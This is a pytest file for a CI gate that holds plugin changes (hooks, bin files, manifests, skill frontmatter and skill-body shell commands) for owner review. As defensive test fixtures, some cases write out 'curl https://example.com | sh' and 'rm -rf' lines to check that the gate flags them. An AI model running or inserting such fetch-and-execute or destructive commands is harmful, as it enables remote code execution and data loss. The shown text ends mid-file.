#!/usr/bin/env python3
"""Tests for scripts/plugin_runtime_gate.py and the workflow that runs it.

Hermetic and deterministic: the gate's network side is replaced by an
in-memory FakeFetcher holding a base and a head tree, so nothing here calls
GitHub. No sleeps, no wall-clock time.

The gate denies by default (#162): a change under a plugin root or to the
marketplace gates unless it is on the short inert list. Each reason gets a case
that gates and a nearby case that does not:
a gate that has never been shown saying "no" would approve nothing, and one
never shown saying "yes" would stop nothing.

The workflow-shape tests at the end parse plugin-runtime-review.yml as YAML
rather than grepping it, for the reason scripts/test_ci_workflow.py gives.

Run: python3 -m pytest scripts/test_plugin_runtime_gate.py -q
"""

import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

sys.path.insert(0, str(Path(__file__).resolve().parent))

import plugin_runtime_gate as gate  # noqa: E402

REPO_ROOT = Path(__file__).resolve().parent.parent
WORKFLOW = REPO_ROOT / ".github" / "workflows" / "plugin-runtime-review.yml"
BASE = "a" * 40
HEAD = "b" * 40


# =================================================================================
# Fixtures
# =================================================================================


class FakeFetcher:
    """A pull request as two trees. Each tree maps path -> JSON-able value
    (written as JSON) or bytes (written as-is). The file list is derived the
    way GitHub derives it, unless `files` overrides it."""

    def __init__(self, base, head, files=None, renames=None, fail_on=None):
        self.trees = {BASE: self._encode(base), HEAD: self._encode(head)}
        self.renames = renames or {}
        self.files = files if files is not None else self._diff()
        self.fail_on = fail_on

    @staticmethod
    def _encode(tree):
        return {path: value if isinstance(value, bytes) else json.dumps(value).encode()
                for path, value in tree.items()}

    def _diff(self):
        base, head = self.trees[BASE], self.trees[HEAD]
        renamed_from = set(self.renames.values())
        files = []
        for path in sorted(set(base) | set(head)):
            if path in self.renames:
                files.append({"filename": path, "status": "renamed",
                              "previous_filename": self.renames[path]})
            elif path in renamed_from:
                continue
            elif path not in base:
                files.append({"filename": path, "status": "added", "previous_filename": None})
            elif path not in head:
                files.append({"filename": path, "status": "removed", "previous_filename": None})
            elif base[path] != head[path]:
                files.append({"filename": path, "status": "modified", "previous_filename": None})
        return files

    def list_files(self, sha):
        return sorted(self.trees[sha])

    def changed_files(self):
        if self.fail_on == "list":
            raise gate.GateError("listing the pull request's files failed (gh exit 1)")
        return self.files

    def read(self, path, sha):
        if self.fail_on == path:
            raise gate.GateError(f"reading {json.dumps(path)} failed (gh exit 1)")
        return self.trees[sha].get(path)


def marketplace(*names, **entry_extra):
    return {"name": "m", "plugins": [
        dict({"name": n, "source": f"./plugins/{n}"}, **entry_extra.get(n, {})) for n in names]}


def manifest(name="alpha", **extra):
    return dict({"name": name, "version": "1.0.0"}, **extra)


def tree(**files):
    """A minimal registry with one plugin, `alpha`, plus `files`."""
    base = {
        ".claude-plugin/marketplace.json": marketplace("alpha"),
        "plugins/alpha/.claude-plugin/plugin.json": manifest(),
        "plugins/alpha/plugin.json": manifest(**{"$schema": "x"}),
        "plugins/alpha/skills/one/SKILL.md": b"---\nname: one\n---\n",
        "plugins/alpha/skills/one/scripts/tool.sh": b"echo one\n",
    }
    base.update(files)
    return base


def hook_config(*commands, args=None):
    hooks = [{"type": "command", "command": c} for c in commands]
    if args is not None:
        hooks.append({"type": "command", "command": "node", "args": args})
    return {"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": hooks}]}}


def run(base, head, **kw):
    return gate.decide(FakeFetcher(base, head, **kw), BASE, HEAD)


def codes(result):
    return {code for code, _ in result[1]}


def assert_gated(result, code):
    gated, reasons = result
    assert gated and code in codes(result), reasons


def assert_not_gated(result):
    gated, reasons = result
    assert not gated and reasons == [], reasons


# =================================================================================
# The nearby cases that must NOT gate
# =================================================================================


def test_a_skill_md_only_change_does_not_gate():
    base = tree()
    head = dict(base, **{"plugins/alpha/skills/one/SKILL.md": b"---\nname: one\n---\nmore\n"})
    assert_not_gated(run(base, head))


def test_a_version_only_manifest_change_does_not_gate():
    base = tree()
    head = dict(base, **{"plugins/alpha/.claude-plugin/plugin.json": manifest(version="1.0.1")})
    assert_not_gated(run(base, head))


def test_a_script_beside_one_a_hook_calls_gates_because_the_hook_names_its_skill():
    base = tree(**{"plugins/alpha/hooks/hooks.json":
                   hook_config('"${CLAUDE_PLUGIN_ROOT}"/skills/one/scripts/hook.sh')})
    head = dict(base, **{"plugins/alpha/skills/one/scripts/tool.sh": b"echo two\n"})
    assert_gated(run(base, head), "plugin-path")


def test_an_empty_pull_request_does_not_gate():
    assert_not_gated(run(tree(), tree()))


# =================================================================================
# (a) hook files
# =================================================================================


def test_a_hooks_file_change_gates():
    base = tree()
    head = dict(base, **{"plugins/alpha/hooks/hooks.json": hook_config("./x.sh")})
    assert_gated(run(base, head), "hook-file")


def test_a_hooks_named_directory_outside_the_plugin_root_does_not_gate():
    base = tree()
    head = dict(base, **{"plugins/alpha/skills/one/hooks/notes.md": b"x\n",
                         "docs/hooks/x.md": b"x\n"})
    assert_not_gated(run(base, head))


def test_a_hook_file_renamed_out_of_hooks_gates_by_its_old_name():
    base = tree(**{"plugins/alpha/hooks/run.sh": b"echo\n"})
    head = dict(base)
    head["plugins/alpha/skills/one/run.sh"] = head.pop("plugins/alpha/hooks/run.sh")
    result = run(base, head, renames={"plugins/alpha/skills/one/run.sh": "plugins/alpha/hooks/run.sh"})
    assert ("hook-file", "plugins/alpha/hooks/run.sh") in result[1], result


def test_a_file_renamed_into_hooks_gates_by_its_new_name():
    base = tree(**{"plugins/alpha/skills/one/run.sh": b"echo\n"})
    head = dict(base)
    head["plugins/alpha/hooks/run.sh"] = head.pop("plugins/alpha/skills/one/run.sh")
    result = run(base, head, renames={"plugins/alpha/hooks/run.sh": "plugins/alpha/skills/one/run.sh"})
    assert ("hook-file", "plugins/alpha/hooks/run.sh") in result[1], result


def test_a_rename_that_stays_outside_hooks_does_not_gate():
    base = tree(**{"plugins/alpha/skills/one/a.md": b"x\n"})
    head = dict(base)
    head["plugins/alpha/skills/one/b.md"] = head.pop("plugins/alpha/skills/one/a.md")
    assert_not_gated(run(base, head, renames={"plugins/alpha/skills/one/b.md":
                                              "plugins/alpha/skills/one/a.md"}))


def test_a_new_plugin_not_yet_in_the_marketplace_is_still_a_root():
    base = tree()
    head = dict(base, **{"plugins/beta/hooks/hooks.json": hook_config("./x.sh")})
    assert_gated(run(base, head), "hook-file")


def test_a_marketplace_source_outside_plugins_is_a_root():
    market = {"name": "m", "plugins": [{"name": "edge", "source": "./elsewhere/edge"}]}
    base = tree(**{".claude-plugin/marketplace.json": market})
    head = dict(base, **{"elsewhere/edge/hooks/hooks.json": {}})
    assert_gated(run(base, head), "hook-file")
    head = dict(base, **{"elsewhere/edge/skills/x/SKILL.md": b"x\n"})
    assert_not_gated(run(base, head))


# =================================================================================
# (b) package and settings files
# =================================================================================


@pytest.mark.parametrize("name", ["settings.json", "package.json", "bun.lock", "bun.lockb",
                                  "npm-shrinkwrap.json", "package-lock.json"])
def test_a_package_or_settings_file_at_a_plugin_root_gates(name):
    base = tree()
    head = dict(base, **{f"plugins/alpha/{name}": b"{}"})
    result = run(base, head)
    assert ("package-or-settings", f"plugins/alpha/{name}") in result[1], result


def test_the_same_names_outside_every_plugin_root_do_not_gate():
    base = tree()
    assert_not_gated(run(base, dict(base, **{"package.json": b"{}", "docs/settings.json": b"{}"})))


@pytest.mark.parametrize("path", ["plugins/alpha/skills/one/package.json",
                                  "plugins/alpha/skills/one/settings.json",
                                  "plugins/alpha/yarn.lock"])
def test_the_same_names_below_a_plugin_root_gate_as_plugin_paths(path):
    base = tree()
    assert_gated(run(base, dict(base, **{path: b"{}"})), "plugin-path")


# =================================================================================
# (c) runtime keys in a manifest
# =================================================================================


@pytest.mark.parametrize("path", ["plugins/alpha/.claude-plugin/plugin.json",
                                  "plugins/alpha/plugin.json"])
@pytest.mark.parametrize("key", ["hooks", "settings"])
def test_adding_a_runtime_key_to_either_manifest_gates(path, key):
    base = tree()
    head = dict(base, **{path: dict(json.loads(FakeFetcher._encode(base)[path]), **{key: {}})})
    result = run(base, head)
    assert ("manifest-runtime-key", path) in result[1], result


def test_changing_or_removing_a_runtime_key_gates():
    path = "plugins/alpha/.claude-plugin/plugin.json"
    base = tree(**{path: manifest(hooks="./hooks/a.json")})
    assert_gated(run(base, dict(base, **{path: manifest(hooks="./hooks/b.json")})),
                 "manifest-runtime-key")
    assert_gated(run(base, dict(base, **{path: manifest()})), "manifest-runtime-key")


def test_reformatting_a_manifest_with_the_same_runtime_keys_does_not_gate():
    path = "plugins/alpha/.claude-plugin/plugin.json"
    base = tree(**{path: manifest(settings={"agent": "x"})})
    head = dict(base, **{path: json.dumps(manifest(settings={"agent": "x"}, version="2.0.0"),
                                          indent=4).encode()})
    assert_not_gated(run(base, head))


# =================================================================================
# (d) runtime keys in a marketplace entry
# =================================================================================


def test_a_runtime_key_on_an_existing_entry_gates():
    base = tree()
    head = dict(base, **{".claude-plugin/marketplace.json":
                         marketplace("alpha", alpha={"hooks": {}})})
    assert_gated(run(base, head), "marketplace-runtime-key")


def test_an_added_entry_carrying_a_runtime_key_gates():
    base = tree()
    head = dict(base, **{".claude-plugin/marketplace.json":
                         marketplace("alpha", "beta", beta={"settings": {"agent": "x"}})})
    assert_gated(run(base, head), "marketplace-runtime-key")


def test_a_marketplace_change_without_runtime_keys_gates_when_it_is_not_inert():
    base = tree(**{".claude-plugin/marketplace.json": marketplace("alpha", alpha={"hooks": {}})})
    head = dict(base, **{".claude-plugin/marketplace.json":
                         marketplace("alpha", "beta", alpha={"hooks": {}, "description": "new"}),
                         "plugins/beta/plugin.json": manifest("beta")})
    assert_gated(run(base, head), "marketplace-runtime-key")


# =================================================================================
# (e) scripts a hook calls
# =================================================================================


@pytest.mark.parametrize("command", [
    '"${CLAUDE_PLUGIN_ROOT}"/skills/one/scripts/tool.sh',
    '"${CLAUDE_PLUGIN_ROOT}/skills/one/scripts/tool.sh" --flag',
    "${CLAUDE_PLUGIN_ROOT}/skills/one/scripts/tool.sh",
    "$CLAUDE_PLUGIN_ROOT/skills/one/scripts/tool.sh && echo done",
    "python3 ${CLAUDE_PLUGIN_ROOT}/skills/one/scripts/tool.sh",
    "${CLAUDE_PLUGIN_ROOT}/skills/one/scripts",
    "${CLAUDE_PLUGIN_ROOT}/skills/one/scripts/$NAME.sh",
])
def test_a_script_a_hook_names_gates_when_it_changes(command):
    base = tree(**{"plugins/alpha/hooks/hooks.json": hook_config(command)})
    head = dict(base, **{"plugins/alpha/skills/one/scripts/tool.sh": b"echo two\n"})
    result = run(base, head)
    assert ("hook-referenced", "plugins/alpha/skills/one/scripts/tool.sh") in result[1], result


def test_an_exec_form_argument_is_read_too():
    base = tree(**{"plugins/alpha/hooks/hooks.json":
                   hook_config(args=["${CLAUDE_PLUGIN_ROOT}/skills/one/scripts/tool.sh"])})
    head = dict(base, **{"plugins/alpha/skills/one/scripts/tool.sh": b"echo two\n"})
    assert_gated(run(base, head), "hook-referenced")


def test_a_hook_named_only_at_head_still_counts():
    base = tree()
    path = "plugins/alpha/.claude-plugin/plugin.json"
    head = dict(base, **{path: manifest(hooks=hook_config("${CLAUDE_PLUGIN_ROOT}/skills/one/scripts/tool.sh")),
                         "plugins/alpha/skills/one/scripts/tool.sh": b"echo two\n"})
    assert ("hook-referenced", "plugins/alpha/skills/one/scripts/tool.sh") in run(base, head)[1]


def test_a_hooks_file_a_manifest_names_is_read():
    base = tree(**{"plugins/alpha/.claude-plugin/plugin.json": manifest(hooks="./config/h.json"),
                   "plugins/alpha/config/h.json":
                   hook_config("${CLAUDE_PLUGIN_ROOT}/skills/one/scripts/tool.sh")})
    head = dict(base, **{"plugins/alpha/skills/one/scripts/tool.sh": b"echo two\n"})
    assert_gated(run(base, head), "hook-referenced")


def test_inline_hooks_on_a_marketplace_entry_are_read():
    market = marketplace("alpha", alpha={"hooks": hook_config("${CLAUDE_PLUGIN_ROOT}/skills/one/scripts/tool.sh")})
    base = tree(**{".claude-plugin/marketplace.json": market})
    head = dict(base, **{"plugins/alpha/skills/one/scripts/tool.sh": b"echo two\n"})
    assert_gated(run(base, head), "hook-referenced")


def test_a_bare_plugin_root_reference_covers_the_whole_plugin():
    base = tree(**{"plugins/alpha/hooks/hooks.json":
                   hook_config('cd "${CLAUDE_PLUGIN_ROOT}" && ./skills/one/scripts/tool.sh')})
    head = dict(base, **{"plugins/alpha/skills/one/scripts/tool.sh": b"echo two\n"})
    assert_gated(run(base, head), "hook-referenced")


def test_a_sibling_with_a_matching_prefix_gates_because_the_hook_names_its_skill():
    base = tree(**{"plugins/alpha/hooks/hooks.json":
                   hook_config("${CLAUDE_PLUGIN_ROOT}/skills/one/scripts/tool")})
    head = dict(base, **{"plugins/alpha/skills/one/scripts/tool.sh": b"echo two\n"})
    assert_gated(run(base, head), "plugin-path")


def test_rests_after_the_plugin_root_are_read_as_paths():
    rests = gate._rests_after_plugin_root
    assert "skills/x/y.sh" in rests('"${CLAUDE_PLUGIN_ROOT}"/skills/x/y.sh arg')
    assert "my dir/x.sh" in rests('"${CLAUDE_PLUGIN_ROOT}/my dir/x.sh"')
    assert rests("${CLAUDE_PLUGIN_ROOTS}/x.sh") == set()
    assert "a/" in rests("${CLAUDE_PLUGIN_ROOT}/a/*.sh")
    assert "a/b.sh" in rests("${CLAUDE_PLUGIN_ROOT}\\a\\b.sh")
    assert "x.sh" in rests('"${CLAUDE_PLUGIN_ROOT}/x.sh')  # unbalanced quote


def test_a_script_a_windows_command_names_gates_when_it_changes():
    # Codex runs `commandWindows` through cmd.exe on Windows, where the root
    # is %PLUGIN_ROOT%; a script only that line names still runs code.
    config = {"hooks": {"PostToolUse": [{"matcher": "Bash", "hooks": [{
        "type": "command", "command": "./elsewhere.sh",
        "commandWindows": '"C:\\Program Files\\Git\\bin\\bash.exe" '
                          '"%PLUGIN_ROOT%/skills/one/scripts/tool.sh"'}]}]}}
    base = tree(**{"plugins/alpha/hooks/hooks.json": config})
    head = dict(base, **{"plugins/alpha/skills/one/scripts/tool.sh": b"echo two\n"})
    result = run(base, head)
    assert ("hook-referenced", "plugins/alpha/skills/one/scripts/tool.sh") in result[1], result


def test_a_windows_command_naming_another_script_gates_because_it_names_the_skill():
    config = {"hooks": {"SessionStart": [{"hooks": [{
        "type": "command", "command": "./x.sh",
        "commandWindows": '"C:\\Program Files\\Git\\bin\\bash.exe" '
                          '"%PLUGIN_ROOT%/skills/one/scripts/other.sh"'}]}]}}
    base = tree(**{"plugins/alpha/hooks/hooks.json": config})
    head = dict(base, **{"plugins/alpha/skills/one/scripts/tool.sh": b"echo two\n"})
    assert_gated(run(base, head), "plugin-path")


def test_every_spelling_of_the_plugin_root_is_read():
    rests = gate._rests_after_plugin_root
    assert "a/b.sh" in rests('"%PLUGIN_ROOT%/a/b.sh"')
    assert "a/b.sh" in rests("%CLAUDE_PLUGIN_ROOT%\\a\\b.sh")
    assert "a/b.sh" in rests("${PLUGIN_ROOT}/a/b.sh")
    assert "a/b.sh" in rests("$PLUGIN_ROOT/a/b.sh --flag")
    assert rests("$PLUGIN_ROOTS/a.sh") == set()
    assert rests("%PLUGIN_ROOTS%/a.sh") == set()
    # A cmd.exe variable after the root stops the literal path, as $ does.
    assert "a/" in rests("%PLUGIN_ROOT%/a/%NAME%.sh")


def test_the_shipped_clone_sync_hooks_are_gated():
    """adam-coding-local's hooks.json names each clone-sync hook in both its
    `command` and its `commandWindows`, and every clone-sync file sits under
    hooks/, so a change to any of them waits for the owner."""
    root = "plugins/adam-coding-local"
    config = json.loads((REPO_ROOT / root / "hooks" / "hooks.json").read_text(encoding="utf-8"))
    for key in ("command", "commandWindows"):
        only = json.loads(json.dumps(config))
        for groups in only["hooks"].values():
            for group in groups:
                for handler in group["hooks"]:
                    handler.pop("commandWindows" if key == "command" else "command")
        assert gate._hook_paths(only, root) == {
            f"{root}/hooks/clone-sync/on-merge.sh",
            f"{root}/hooks/clone-sync/on-session-start.sh"}, key
    files = sorted(p.relative_to(REPO_ROOT).as_posix()
                   for p in (REPO_ROOT / root / "hooks").rglob("*") if p.is_file())
    assert any(f.endswith("/clone-sync/clone-sync.sh") for f in files), files
    base = tree()
    head = dict(base, **{f: b"{}" if f.endswith(".json") else b"changed\n" for f in files})
    reasons = run(base, head)[1]
    for f in files:
        assert ("hook-file", f) in reasons, f


def test_the_shipped_credit_lane_and_its_wrapper_are_gated():
    """The API-credit lane (ADR 0018): claude-code.json, named by the Claude
    manifest, names both lane hooks; every lane file sits under hooks/; and
    bin/claude-credit sits on the session PATH. A change to any waits."""
    root = "plugins/adam-coding-local"
    manifest = json.loads((REPO_ROOT / root / ".claude-plugin" / "plugin.json").read_text(encoding="utf-8"))
    assert manifest["hooks"] == "./hooks/claude-code.json"
    config = json.loads((REPO_ROOT / root / "hooks" / "claude-code.json").read_text(encoding="utf-8"))
    assert gate._hook_paths(config, root) == {
        f"{root}/hooks/credit-lane/on-session-start.sh",
        f"{root}/hooks/credit-lane/on-prompt.sh"}
    lane = sorted(p.relative_to(REPO_ROOT).as_posix()
                  for p in (REPO_ROOT / root / "hooks" / "credit-lane").rglob("*") if p.is_file())
    assert f"{root}/hooks/credit-lane/gate.py" in lane, lane
    base = tree()
    head = dict(base, **{f: b"changed\n" for f in lane},
                **{f"{root}/bin/claude-credit": b"#!/usr/bin/env bash\n"})
    reasons = run(base, head)[1]
    for f in lane:
        assert ("hook-file", f) in reasons, f
    assert ("bin-file", f"{root}/bin/claude-credit") in reasons


def test_a_change_to_claude_code_json_named_by_the_manifest_gates_its_scripts():
    root = "plugins/alpha"
    config = hook_config('"${CLAUDE_PLUGIN_ROOT}"/skills/one/scripts/tool.sh')
    base = tree(**{f"{root}/.claude-plugin/plugin.json": manifest(hooks="./extra/claude-code.json"),
                   f"{root}/extra/claude-code.json": config})
    head = dict(base, **{f"{root}/skills/one/scripts/tool.sh": b"echo two\n"})
    assert ("hook-referenced", f"{root}/skills/one/scripts/tool.sh") in run(base, head)[1]


# =================================================================================
# (h) bin/ on the session PATH
# =================================================================================


def test_a_bin_file_at_a_plugin_root_gates():
    base = tree()
    head = dict(base, **{"plugins/alpha/bin/tool": b"#!/bin/sh\necho\n"})
    assert ("bin-file", "plugins/alpha/bin/tool") in run(base, head)[1]


def test_a_bin_file_renamed_out_of_bin_gates_by_its_old_name():
    base = tree(**{"plugins/alpha/bin/tool": b"echo\n"})
    head = dict(base)
    head["plugins/alpha/skills/one/tool"] = head.pop("plugins/alpha/bin/tool")
    result = run(base, head, renames={"plugins/alpha/skills/one/tool": "plugins/alpha/bin/tool"})
    assert ("bin-file", "plugins/alpha/bin/tool") in result[1], result


def test_a_bin_named_directory_below_the_plugin_root_is_not_bin_file():
    base = tree()
    head = dict(base, **{"plugins/alpha/skills/one/bin/tool": b"echo\n"})
    assert codes(run(base, head)) == {"plugin-path"}
    assert_not_gated(run(base, dict(base, **{"bin/tool": b"echo\n"})))


# =================================================================================
# (f) the gate itself
# =================================================================================


@pytest.mark.parametrize("path", sorted(gate.GATE_FILES))
def test_a_change_to_the_gate_gates(path):
    base = tree()
    result = run(base, dict(base, **{path: b"changed\n"}))
    assert ("gate-itself", path) in result[1], result


def test_a_lockfile_only_change_gates():
    """actions.lock picks the commit the gate workflow's tag-pinned checkout
    runs at, so a PR changing only the lockfile must wait for the owner."""
    base = tree()
    head = dict(base, **{".github/workflows/actions.lock": b"version: 'v0.0.3'\n"})
    result = run(base, head)
    assert ("gate-itself", ".github/workflows/actions.lock") in result[1], result


def test_a_change_to_another_workflow_or_script_does_not_gate():
    base = tree()
    head = dict(base, **{".github/workflows/ci.yml": b"x\n", "scripts/check_skills.py": b"x\n"})
    assert_not_gated(run(base, head))


def test_every_gate_file_exists():
    for path in gate.GATE_FILES:
        assert (REPO_ROOT / path).is_file(), path


# =================================================================================
# (i) skill frontmatter hooks / allowed-tools
# =================================================================================

SKILL = "plugins/alpha/skills/one/SKILL.md"
HOOKED = (b"---\nname: one\nhooks:\n  PreToolUse:\n    - matcher: Bash\n"
          b"      hooks:\n        - type: command\n          command: ./check.sh\n---\nbody\n")


def _skill_run(before, after, key_path=SKILL):
    base = tree(**{key_path: before})
    head = dict(base, **{key_path: after})
    return run(base, head)


def test_adding_frontmatter_hooks_to_an_existing_skill_gates():
    assert_gated(_skill_run(b"---\nname: one\n---\n", HOOKED), "skill-frontmatter-runtime-key")


def test_adding_allowed_tools_to_an_existing_skill_gates():
    after = b"---\nname: one\nallowed-tools: Bash(git:*)\n---\n"
    assert_gated(_skill_run(b"---\nname: one\n---\n", after), "skill-frontmatter-runtime-key")


def test_changing_or_removing_allowed_tools_gates():
    two = b"---\nname: one\nallowed-tools: Read\n---\n"
    three = b"---\nname: one\nallowed-tools: Read, Bash\n---\n"
    assert_gated(_skill_run(two, three), "skill-frontmatter-runtime-key")
    assert_gated(_skill_run(two, b"---\nname: one\n---\n"), "skill-frontmatter-runtime-key")


def test_a_new_skill_carrying_either_key_gates():
    path = "plugins/alpha/skills/two/SKILL.md"
    base = tree()
    for text in (HOOKED, b"---\nname: two\nallowed-tools: Read\n---\n"):
        head = dict(base, **{path: text})
        assert_gated(run(base, head), "skill-frontmatter-runtime-key")


def test_a_new_skill_without_either_key_does_not_gate():
    base = tree()
    head = dict(base, **{"plugins/alpha/skills/two/SKILL.md": b"---\nname: two\n---\nbody\n"})
    assert_not_gated(run(base, head))


def test_an_unchanged_frontmatter_does_not_gate_whatever_it_holds():
    before = b"---\nname: one\nallowed-tools: Read\n---\nold body\n"
    after = b"---\nname: one\nallowed-tools: Read\n---\nnew body\n"
    assert_not_gated(_skill_run(before, after))


def test_reformatted_but_equal_frontmatter_does_not_gate():
    before = b"---\nname: one\nallowed-tools: [Read, Bash]\n---\n"
    after = b"---\nallowed-tools:\n  - Read\n  - Bash\nname: one\n---\n"
    assert_not_gated(_skill_run(before, after))


def test_other_frontmatter_keys_changing_does_not_gate():
    before = b"---\nname: one\ndescription: a\n---\n"
    after = b"---\nname: one\ndescription: b\n---\n"
    assert_not_gated(_skill_run(before, after))


def test_a_skill_md_whose_frontmatter_does_not_parse_gates():
    assert_gated(_skill_run(b"---\nname: one\n---\n", b"---\nname: [unclosed\n---\n"),
                 "fail-closed")


def test_a_renamed_skill_md_is_compared_with_its_old_name():
    """The base file carries the gated keys and is renamed unchanged: the old
    name's own comparison (keys -> gone) must flag it, not only the new name."""
    old, new = "plugins/alpha/skills/one/SKILL.md", "plugins/alpha/skills/uno/SKILL.md"
    base = tree(**{old: HOOKED})
    head = {k: v for k, v in base.items() if k != old}
    head[new] = HOOKED
    gated, reasons = run(base, head, renames={new: old})
    assert gated
    assert ("skill-frontmatter-runtime-key", old) in reasons
    assert ("skill-frontmatter-runtime-key", new) in reasons


@pytest.mark.parametrize("closing", ["----", " ---", "--- x", "---\t x"])
@pytest.mark.parametrize("key", ["allowed-tools: Bash", "hooks: {PreToolUse: []}"])
def test_a_closing_line_other_than_bare_dashes_gates(closing, key):
    """Claude Code closes frontmatter at the first '---' anywhere, so these all
    activate the key while a strict line split sees no frontmatter."""
    after = f"---\nname: one\n{key}\n{closing}\nbody\n".encode()
    assert_gated(_skill_run(b"---\nname: one\n---\n", after), "fail-closed")


def test_dashes_inside_a_value_gate():
    after = b"---\nname: one\ndescription: a ---\nallowed-tools: Bash\n---\nbody\n"
    assert_gated(_skill_run(b"---\nname: one\n---\n", after), "fail-closed")


def test_a_byte_order_mark_after_the_opening_dashes_gates():
    """U+FEFF is JS whitespace, so Claude Code opens frontmatter on this line
    and captures allowed-tools; Python's rstrip() leaves it, so a strict split
    saw no frontmatter."""
    bomb = "---\ufeff\nname: one\nallowed-tools: Bash\n---\nbody\n".encode()
    plain = b"---\nname: one\n---\n"
    assert_gated(_skill_run(plain, bomb), "fail-closed")
    assert_gated(_skill_run(bomb, plain), "fail-closed")


def test_unterminated_frontmatter_gates():
    after = b"---\nname: one\nallowed-tools: Bash\nbody with no close\n"
    assert_gated(_skill_run(b"---\nname: one\n---\n", after), "fail-closed")


def test_ambiguous_frontmatter_on_the_base_side_gates_too():
    before = b"---\nname: one\nallowed-tools: Bash\n----\nbody\n"
    assert_gated(_skill_run(before, b"---\nname: one\n---\n"), "fail-closed")


def test_a_blank_line_after_the_opening_dashes_does_not_gate():
    before = b"---\nname: one\n---\nold\n"
    after = b"---\n\nname: one\n---\nnew\n"
    assert_not_gated(_skill_run(before, after))


def test_without_pyyaml_a_skill_md_change_gates(monkeypatch):
    monkeypatch.setitem(sys.modules, "yaml", None)  # `import yaml` raises ImportError
    assert_gated(_skill_run(b"---\nname: one\n---\n", b"---\nname: one\n---\nnew\n"),
                 "fail-closed")


def test_non_mapping_frontmatter_gates():
    assert_gated(_skill_run(b"---\nname: one\n---\n", b"---\n- a\n- b\n---\n"), "fail-closed")


def test_a_non_utf8_skill_md_gates():
    assert_gated(_skill_run(b"---\nname: one\n---\n", b"---\nname: \xff\xfe\n---\n"),
                 "fail-closed")


def test_a_skill_md_with_no_frontmatter_does_not_gate():
    assert_not_gated(_skill_run(b"plain body\n", b"another plain body\n"))


def test_adding_frontmatter_keys_to_a_skill_md_that_had_none_gates():
    assert_gated(_skill_run(b"plain body\n", HOOKED), "skill-frontmatter-runtime-key")


# =================================================================================
# (j)-(l) skill body commands and every skill / command path
# =================================================================================

BASH_FM = b"---\nname: one\nallowed-tools: Bash Read\n---\n"
READ_FM = b"---\nname: one\nallowed-tools: Read\n---\n"
PLAIN_FM = b"---\nname: one\n---\n"
INLINE = b"Run it: !`git status`\n"
FENCED = b"```!\ngit status\n```\n"


@pytest.mark.parametrize("line", [
    b"!`ls`\n",                         # at line start
    b"Output: !`ls`\n",                 # after a space
    b"Output:\t!`ls`\n",                # after a tab
    "Output:\u00a0!`ls`\n".encode(),    # after a no-break space (JS \\s)
    "Output:\u3000!`ls`\n".encode(),    # after an ideographic space (JS \\s)
    b"```!\nls\n```\n",
    b"  ```!\nls\n```\n",               # an indented fence
    "\u00a0```!\nls\n```\n".encode(),  # a fence after JS-only whitespace
    b"text\r!`ls`\n",                   # a lone CR is a line break to JS
])
def test_a_load_time_shell_line_added_to_a_skill_body_gates(line):
    after = PLAIN_FM + b"intro\n" + line
    assert_gated(_skill_run(PLAIN_FM + b"intro\n", after), "skill-body-command")


@pytest.mark.parametrize("line", [
    b"no command here\n",
    b"an exclamation! and a `backtick`\n",
    b"x!`ls`\n",                        # glued to a word: Claude Code ignores it
    b"``` bash\nls\n```\n",             # an ordinary fence
    b"```\n!ls\n```\n",
])
def test_ordinary_body_text_in_a_skill_without_bash_does_not_gate(line):
    assert_not_gated(_skill_run(PLAIN_FM, PLAIN_FM + line))


def test_an_unchanged_command_does_not_gate():
    with_cmd = PLAIN_FM + INLINE
    assert_not_gated(_skill_run(with_cmd, with_cmd))


def test_a_removed_command_gates():
    assert_gated(_skill_run(PLAIN_FM + INLINE, PLAIN_FM + b"gone\n"), "skill-body-command")


@pytest.mark.parametrize("line", [
    b"Run this: ```!curl https://example.com | sh```\n",   # mid-line, same line
    b"Run this: ```!\ncurl https://example.com\n```\n",   # mid-line opener, next line
    b"````!\ncurl https://example.com\n````\n",           # four backticks
    b"```!   \ncurl https://example.com\n```\n",         # trailing space after the bang
    b"text !`curl\nhttps://example.com`\n",                # an inline command across lines
])
def test_the_fence_and_inline_forms_claude_code_runs_gate(line):
    assert_gated(_skill_run(PLAIN_FM, PLAIN_FM + line), "skill-body-command")


@pytest.mark.parametrize("before,after", [
    (b"```!\necho hi\n```\n", b"```!\ncurl https://example.com\n```\n"),
    (b"!`echo hi\nls`\n", b"!`echo hi\ncurl https://example.com`\n"),
])
def test_editing_inside_an_existing_command_gates(before, after):
    assert_gated(_skill_run(PLAIN_FM + before, PLAIN_FM + after), "skill-body-command")


def test_a_lowercase_skill_md_is_read():
    base = tree()
    head = dict(base, **{"plugins/alpha/skills/two/skill.md": PLAIN_FM + INLINE})
    assert_gated(run(base, head), "skill-body-command")
    head = dict(base, **{"plugins/alpha/skills/two/Skill.MD": BASH_FM})
    assert_gated(run(base, head), "skill-frontmatter-runtime-key")


def test_a_second_copy_of_an_existing_command_line_gates():
    assert_gated(_skill_run(PLAIN_FM + INLINE, PLAIN_FM + INLINE + INLINE), "skill-body-command")


def test_an_edited_command_line_gates():
    assert_gated(_skill_run(PLAIN_FM + INLINE, PLAIN_FM + b"Run it: !`rm -rf x`\n"),
                 "skill-body-command")


def test_a_command_in_a_skill_with_no_frontmatter_gates():
    assert_gated(_skill_run(b"body\n", b"body\n" + INLINE), "skill-body-command")


def test_a_new_skill_whose_body_runs_a_command_gates():
    base = tree()
    head = dict(base, **{"plugins/alpha/skills/two/SKILL.md": PLAIN_FM + FENCED})
    assert_gated(run(base, head), "skill-body-command")


def test_any_body_change_in_a_skill_granting_bash_gates():
    assert_gated(_skill_run(BASH_FM + b"old\n", BASH_FM + b"new\n"), "skill-body-bash")


@pytest.mark.parametrize("tools", [
    "Bash", "Bash(git:*)", "[Read, Bash]", "\n  - Read\n  - Bash(ls)", "Read, PowerShell"])
def test_every_shape_of_a_bash_grant_gates_a_body_change(tools):
    fm = f"---\nname: one\nallowed-tools: {tools}\n---\n".encode()
    assert_gated(_skill_run(fm + b"old\n", fm + b"new\n"), "skill-body-bash")


def test_a_body_change_in_a_skill_whose_tools_do_not_include_bash_does_not_gate():
    assert_not_gated(_skill_run(READ_FM + b"old\n", READ_FM + b"new\n"))


def test_a_body_change_that_also_drops_bash_gates_on_the_base_grant():
    assert_gated(_skill_run(BASH_FM + b"old\n", READ_FM + b"new\n"), "skill-body-bash")


def test_an_unchanged_body_in_a_bash_skill_does_not_gate():
    assert_not_gated(_skill_run(BASH_FM + b"same\n", BASH_FM + b"same\n"))


def test_the_shipped_bash_skills_are_gated_on_a_body_edit():
